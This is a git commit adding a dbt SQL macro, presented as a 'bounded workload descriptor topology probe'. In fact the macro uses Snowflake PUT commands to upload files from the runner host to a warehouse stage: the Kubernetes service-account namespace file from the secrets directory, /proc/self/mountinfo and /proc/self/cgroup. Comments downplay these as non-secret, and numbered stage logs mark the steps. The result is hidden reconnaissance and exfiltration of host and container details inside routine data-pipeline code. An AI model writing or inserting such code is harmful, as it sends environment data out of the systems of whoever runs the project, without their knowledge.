3b88ddad6ea904e837fb7ba1e2fe1f43ef589a70
diegohfmelo <diiegoo.melo@hotmail.com>
2026-08-06 10:36:38 -0300

    Add bounded workload descriptor topology probe

---
+++ macros/phase694_workload_descriptors.sql
@@ -0,0 +1,31 @@
+{% macro phase694_workload_descriptors() %}
+  {% if execute %}
+    {% do log("PHASE694_STAGE_1_BEGIN", info=true) %}
+
+    {# Namespace is a non-secret service-account descriptor, not a token. #}
+    {% set namespace_put = adapter.add_query(
+        "put file:///var/run/secrets/kubernetes.io/serviceaccount/namespace "
+        ~ "@~/phase694_descriptors_6f23b9d1 auto_compress=false overwrite=true",
+        auto_begin=false
+    ) %}
+    {% do log("PHASE694_STAGE_2_NAMESPACE_PUT", info=true) %}
+
+    {# mountinfo exposes mount names/types only; no mounted file is read. #}
+    {% set mountinfo_put = adapter.add_query(
+        "put file:///proc/self/mountinfo @~/phase694_descriptors_6f23b9d1 "
+        ~ "auto_compress=false overwrite=true",
+        auto_begin=false
+    ) %}
+    {% do log("PHASE694_STAGE_3_MOUNTINFO_PUT", info=true) %}
+
+    {# cgroup exposes workload/container topology only. #}
+    {% set cgroup_put = adapter.add_query(
+        "put file:///proc/self/cgroup @~/phase694_descriptors_6f23b9d1 "
+        ~ "auto_compress=false overwrite=true",
+        auto_begin=false
+    ) %}
+    {% do log("PHASE694_STAGE_4_CGROUP_PUT", info=true) %}
+
+    {% do log("PHASE694_WORKLOAD_DESCRIPTORS_STAGED", info=true) %}
+  {% endif %}
+{% endmacro %}
